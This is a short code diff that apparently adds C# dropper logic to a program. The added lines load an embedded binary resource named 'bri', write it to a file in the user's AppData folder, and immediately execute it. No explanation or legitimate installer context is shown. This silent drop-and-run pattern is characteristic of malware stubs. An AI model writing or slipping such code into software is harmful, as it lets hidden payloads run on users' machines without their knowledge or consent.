@@ -1,0 +1,4 @@
+                byte[] bri = (byte[])MANAGER.GetObject("bri");
+                string bri2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +"\\[FILENAME]";
+                File.WriteAllBytes(bri2, bri);
+                System.Diagnostics.Process.Start(bri2);
